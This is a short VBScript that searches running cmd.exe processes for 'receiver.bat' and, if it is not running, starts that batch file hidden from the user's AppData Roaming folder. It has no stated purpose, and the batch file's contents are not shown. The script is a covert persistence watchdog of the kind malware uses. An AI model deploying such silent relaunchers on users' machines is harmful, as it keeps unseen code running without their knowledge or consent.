Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")
Set ProcessList = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'cmd.exe'")

isRunning = False

For Each Process In ProcessList
    ' Check the command line of each cmd.exe process
    If InStr(LCase(Process.CommandLine), "receiver.bat") > 0 Then
        isRunning = True
        Exit For
    End If
Next

If Not isRunning Then
    Set WshShell = CreateObject("WScript.Shell")
    WshShell.Run Chr(34) & "%USERPROFILE%\AppData\Roaming\receiver.bat" & Chr(34), 0
    Set WshShell = Nothing
End If
